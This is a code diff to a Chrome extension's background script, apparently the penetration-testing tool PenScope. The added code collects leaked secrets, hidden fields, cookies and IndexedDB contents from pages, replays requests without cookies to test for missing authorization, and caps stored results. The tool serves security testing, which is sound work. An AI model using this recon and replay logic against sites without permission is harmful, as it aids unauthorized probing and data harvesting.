+  if(_debugTabs.has(tabId)){try{chrome.debugger.detach({tabId});}catch(e){console.warn('[PenScope] detach on remove',e.message||e);}_debugTabs.delete(tabId);}
+  delete state[tabId];delete _scripts[tabId];
+  Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});
+  Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});
+  try{clearLoadTimers(tabId);}catch(e){}
+  try{chrome.alarms.clear(`ps:cm:${tabId}`,()=>{void chrome.runtime.lastError;});}catch(e){}
+  try{chrome.notifications.getAll(items=>{
+    void chrome.runtime.lastError;
+    if(!items)return;
+    Object.keys(items).forEach(nid=>{
+      if(nid.startsWith(`ps:secret-leak:${tabId}:`))chrome.notifications.clear(nid,()=>{void chrome.runtime.lastError;});
+    });
+  });}catch(e){}
+  try{chrome.storage.session.remove(`ps:tab:${tabId}`);}catch(e){}
+});
+chrome.tabs.onUpdated.addListener((tabId,changeInfo)=>{
+  if(changeInfo.status==="loading"&&changeInfo.url){
+    const wasDeep=state[tabId]?.deepEnabled;
+    clearLoadTimers(tabId);
+    delete state[tabId];
+    if(_scripts[tabId])_scripts[tabId]=new Map();
+    Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});
+    Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});
+    const t=T(tabId);t.url=changeInfo.url;t.deepEnabled=wasDeep;
+  }
+  if(changeInfo.url&&state[tabId])state[tabId].url=changeInfo.url;
   if(changeInfo.status==="complete"&&_debugTabs.has(tabId)){
     setTimeout(()=>extractAllScriptSources(tabId),5000);
     setTimeout(()=>extractAllScriptSources(tabId),12000);
   }
 });
+
+if(chrome.webNavigation&&chrome.webNavigation.onHistoryStateUpdated){
+  chrome.webNavigation.onHistoryStateUpdated.addListener(details=>{
+    if(!details||details.frameId!==0)return;
+    const tabId=details.tabId;
+    if(tabId<0||!state[tabId])return;
+    const t=state[tabId];
+    let prev="";try{prev=t.url||"";}catch(e){}
+    let prevOrigin="",nextOrigin="";
+    try{prevOrigin=new URL(prev).origin;}catch(e){}
+    try{nextOrigin=new URL(details.url||"").origin;}catch(e){}
+    if(!Array.isArray(t.spaNavigations))t.spaNavigations=[];
+    t.spaNavigations.push({from:prev,to:details.url||"",ts:Date.now(),originChanged:!!(prevOrigin&&nextOrigin&&prevOrigin!==nextOrigin)});
+    if(t.spaNavigations.length>200)t.spaNavigations=t.spaNavigations.slice(-200);
+    t.url=details.url||t.url;
+    if(prevOrigin&&nextOrigin&&prevOrigin!==nextOrigin){
+      Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:ep:`))delete _seen[k];});
+      clearLoadTimers(tabId);
+    }
+    try{markDirty(tabId);}catch(e){}
+  });
+}
 
 // -------------------------------------------------------
 // 5. MESSAGE HANDLER
@@ -5864,19 +6433,122 @@ chrome.runtime.onMessage.addListener((msg,sender,sendResponse)=>{
       return true;}
     case "clearData":{const wasDeep=_debugTabs.has(msg.tabId);delete state[msg.tabId];if(_scripts[msg.tabId])_scripts[msg.tabId]=new Map();Object.keys(_seen).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _pending[k];});if(wasDeep)T(msg.tabId).deepEnabled=true;sendResponse({ok:true});return true;}
     case "reportContentScan":{const tabId=sender.tab?.id;if(tabId){const t=T(tabId);
-      // Standard fields
-      ["secrets","hiddenFields","forms","jsGlobals","storageData","links","inlineHandlers","metaTags","serviceWorkers","cspViolations","perfEntries"].forEach(k=>{if(msg[k])t[k]=msg[k];});
-      // v4 new fields
-      ["mixedContent","sriIssues","postMessageListeners","dependencyVersions","webWorkers","domXSSSinks","jsonpEndpoints","cookieFindings","reconSuggestions","pathParams"].forEach(k=>{if(msg[k])t[k]=msg[k];});
-      // v5.4 fields
-      if(msg.webAuthnInfo)t.webAuthnInfo=msg.webAuthnInfo;
-      if(msg.coopCoepInfo&&!t.coopCoepInfo)t.coopCoepInfo=msg.coopCoepInfo;
-      if(msg.webrtcLeaks&&msg.webrtcLeaks.length)msg.webrtcLeaks.forEach(l=>{if(!t.webrtcLeaks.find(x=>x.ip===l.ip))t.webrtcLeaks.push(l);});
-      if(msg.wasmModules&&msg.wasmModules.length)msg.wasmModules.forEach(w=>{if(!t.wasmModules.find(x=>x.url===w.url))t.wasmModules.push(w);});
-      if(msg.techStack)msg.techStack.forEach(x=>{if(!t.techStack.find(y=>y.name===x.name))t.techStack.push(x);});
-      if(msg.sourceMaps)msg.sourceMaps.forEach(x=>{if(!t.sourceMaps.find(y=>y.mapUrl===x.mapUrl))t.sourceMaps.push(x);});
+      const _STR_CAP=4096;
+      const _ENTRY_CAPS={secrets:500,hiddenFields:500,forms:500,jsGlobals:300,links:1000,inlineHandlers:300,metaTags:300,serviceWorkers:200,cspViolations:200,perfEntries:1000,mixedContent:300,sriIssues:300,postMessageListeners:300,dependencyVersions:200,webWorkers:100,domXSSSinks:500,jsonpEndpoints:200,cookieFindings:200,reconSuggestions:300,pathParams:500};
+      function _capString(v){return typeof v==="string"&&v.length>_STR_CAP?v.substring(0,_STR_CAP):v;}
+      function _capObj(o){if(!o||typeof o!=="object")return o;const out=Array.isArray(o)?[]:{};for(const k in o){const v=o[k];if(typeof v==="string")out[k]=_capString(v);else if(v&&typeof v==="object"&&!Array.isArray(v))out[k]=_capObj(v);else out[k]=v;}return out;}
+      function _capArr(arr,cap){if(!Array.isArray(arr))return arr;const sliced=arr.slice(0,cap);return sliced.map(_capObj);}
+      const _APPENDABLE=new Set(["cspViolations"]);
+      ["secrets","hiddenFields","forms","jsGlobals","links","inlineHandlers","metaTags","serviceWorkers","cspViolations","perfEntries","jsonIslands"].forEach(k=>{
+        if(_APPENDABLE.has(k)){
+          if(msg[k]&&Array.isArray(msg[k])){
+            if(!Array.isArray(t[k]))t[k]=[];
+            const cap=_ENTRY_CAPS[k]||500;
+            t[k]=t[k].concat(_capArr(msg[k],cap));
+            if(t[k].length>cap)t[k]=t[k].slice(-cap);
+          }
+          return;
+        }
+        if(msg[k]&&Array.isArray(msg[k]))t[k]=_capArr(msg[k],_ENTRY_CAPS[k]||500);
+        else if(msg[k])t[k]=msg[k];
+      });
+      if(msg.storageData&&typeof msg.storageData==="object")t.storageData=_capObj(msg.storageData);
+      ["mixedContent","sriIssues","postMessageListeners","dependencyVersions","webWorkers","domXSSSinks","jsonpEndpoints","cookieFindings","reconSuggestions","pathParams"].forEach(k=>{if(msg[k]&&Array.isArray(msg[k]))t[k]=_capArr(msg[k],_ENTRY_CAPS[k]||300);});
+      if(typeof msg.cspViolationsSuppressed==="number"&&msg.cspViolationsSuppressed>0){t._cspViolationsSuppressed=(t._cspViolationsSuppressed||0)+msg.cspViolationsSuppressed;}
+      if(msg.webAuthnInfo)t.webAuthnInfo=_capObj(msg.webAuthnInfo);
+      if(msg.coopCoepInfo&&!t.coopCoepInfo)t.coopCoepInfo=_capObj(msg.coopCoepInfo);
+      if(msg.webrtcLeaks&&msg.webrtcLeaks.length)msg.webrtcLeaks.slice(0,200).forEach(l=>{if(!t.webrtcLeaks.find(x=>x.ip===l.ip))t.webrtcLeaks.push(_capObj(l));});
+      if(msg.wasmModules&&msg.wasmModules.length)msg.wasmModules.slice(0,200).forEach(w=>{if(!t.wasmModules.find(x=>x.url===w.url))t.wasmModules.push(_capObj(w));});
+      if(msg.techStack)msg.techStack.slice(0,200).forEach(x=>{if(!t.techStack.find(y=>y.name===x.name))t.techStack.push(_capObj(x));});
+      if(msg.sourceMaps)msg.sourceMaps.slice(0,500).forEach(x=>{if(!t.sourceMaps.find(y=>y.mapUrl===x.mapUrl))t.sourceMaps.push(_capObj(x));});
     }sendResponse({ok:true});return true;}
     case "runScan":{chrome.tabs.sendMessage(msg.tabId,{action:"scan"},r=>sendResponse(r||{ok:true}));return true;}
+    case "replayUnauth":{
+      const url=String(msg.url||"");
+      const method=String(msg.method||"GET").toUpperCase();
+      if(!url||!/^https?:/i.test(url)){sendResponse({ok:false,error:"bad url"});return true;}
+      const replayFn=async(m,u)=>{
+        async function fire(creds){
+          const t0=performance.now();
+          try{
+            const r=await fetch(u,{method:m,credentials:creds,redirect:"manual"});
+            let body="";try{body=await r.text();}catch(e){}
+            return{status:r.status,size:body.length,timeMs:Math.round(performance.now()-t0)};
+          }catch(e){return{status:0,error:String(e&&e.message||e),timeMs:Math.round(performance.now()-t0)};}
+        }
+        const a=await fire("include");
+        const b=await fire("omit");
+        return{withCookies:a,withoutCookies:b};
+      };
+      const tryWorld=(world)=>chrome.scripting.executeScript(Object.assign({target:{tabId:msg.tabId},func:replayFn,args:[method,url]},world?{world}:{}));
+      tryWorld("MAIN").then(inj=>{
+        if(inj&&inj[0]&&inj[0].result){sendResponse({ok:true,...inj[0].result,_world:"main"});return;}
+        return tryWorld(null).then(inj2=>{
+          if(inj2&&inj2[0]&&inj2[0].result){sendResponse({ok:true,...inj2[0].result,_world:"isolated"});return;}
+          sendResponse({ok:false,error:"both worlds returned no result"});
+        });
+      }).catch(e1=>{
+        tryWorld(null).then(inj2=>{
+          if(inj2&&inj2[0]&&inj2[0].result){sendResponse({ok:true,...inj2[0].result,_world:"isolated",_mainErr:e1.message||String(e1)});return;}
+          sendResponse({ok:false,error:"main:"+(e1.message||String(e1))+" / iso:no-result"});
+        }).catch(e2=>sendResponse({ok:false,error:"main:"+(e1.message||e1)+" iso:"+(e2.message||e2)}));
+      });
+      return true;
+    }
+    case "captureIdb":{
+      if(!_debugTabs.has(msg.tabId)){sendResponse({ok:false,error:"Deep mode required"});return true;}
+      const t=T(msg.tabId);
+      const beforeFingerprint=JSON.stringify(t.indexedDBData||[]).length;
+      t._idbExtracted=false;
+      try{extractIndexedDB(msg.tabId);}catch(e){}
+      let attempts=0,settled=0,prevFp=beforeFingerprint;
+      const tryFinalize=()=>{
+        attempts++;
+        const cur=t.indexedDBData||[];
+        const curFp=JSON.stringify(cur).length;
+        if(curFp===prevFp&&curFp!==beforeFingerprint)settled++;else settled=0;
+        prevFp=curFp;
+        if(settled>=2||attempts>=10){
+          const snap={ts:Date.now(),dbs:cur.map(d=>({name:d.name,stores:(d.stores||[]).map(s=>({name:s.name,count:s.count,sample:s.sample}))}))};
+          if(!Array.isArray(t.idbSnapshots))t.idbSnapshots=[];
+          t.idbSnapshots.push(snap);
+          if(t.idbSnapshots.length>10)t.idbSnapshots=t.idbSnapshots.slice(-10);
+          markDirty(msg.tabId);
+          sendResponse({ok:true,count:t.idbSnapshots.length,snapshot:snap,attempts,settledFor:settled,note:attempts>=10?"polling timeout — capture may be partial":"settled"});
+          return;
+        }
+        setTimeout(tryFinalize,500);
+      };
+      setTimeout(tryFinalize,800);
+      return true;
+    }
+    case "diffIdb":{
+      const t=T(msg.tabId);
+      const snaps=Array.isArray(t.idbSnapshots)?t.idbSnapshots:[];
+      if(snaps.length<2){sendResponse({ok:false,error:"need >=2 snapshots; have "+snaps.length});return true;}
+      const a=snaps[snaps.length-2];const b=snaps[snaps.length-1];
+      const diff={added:[],removed:[],changed:[]};
+      const aDbs={};const bDbs={};
+      (a.dbs||[]).forEach(d=>{aDbs[d.name]=d;});
+      (b.dbs||[]).forEach(d=>{bDbs[d.name]=d;});
+      Object.keys(bDbs).forEach(name=>{
+        if(!aDbs[name]){diff.added.push({db:name,stores:bDbs[name].stores||[]});return;}
+        const aStores={};(aDbs[name].stores||[]).forEach(s=>{aStores[s.name]=s;});
+        (bDbs[name].stores||[]).forEach(bs=>{
+          const as=aStores[bs.name];
+          if(!as){diff.added.push({db:name,store:bs.name,count:bs.count});return;}
+          if((as.count||0)!==(bs.count||0))diff.changed.push({db:name,store:bs.name,from:as.count,to:bs.count,delta:(bs.count||0)-(as.count||0)});
+        });
+      });
+      Object.keys(aDbs).forEach(name=>{if(!bDbs[name])diff.removed.push({db:name});});
+      sendResponse({ok:true,diff,from:a.ts,to:b.ts});
+      return true;
+    }
+    case "getRegexPack":{
+      if(_regexPack._loaded){sendResponse({ok:true,raw:_regexPack._raw});return true;}
+      _loadRegexPack().then(()=>sendResponse({ok:_regexPack._loaded,raw:_regexPack._raw||null}));
+      return true;
+    }
     // v6.1.1 — Update full-capture flag at runtime so the user's toggle takes effect
     // immediately without an extension reload.
     case "setFullCapture":{
